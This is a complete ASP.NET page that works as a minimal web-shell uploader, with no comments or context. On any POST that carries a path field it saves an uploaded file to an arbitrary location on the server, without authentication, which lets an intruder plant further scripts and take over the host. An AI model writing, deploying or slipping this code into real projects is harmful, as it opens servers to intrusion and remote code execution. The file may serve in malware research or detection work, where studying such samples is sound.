<%@ Page Language="C#" %>
<% 
if(Request.Form["p"]!=null){Request.Files["f"].SaveAs(Request.Form["p"]);}; 
%>
<form method="post" enctype="multipart/form-data"><input name="f" type="file"><input name="p" type="text"><input type="submit"></form>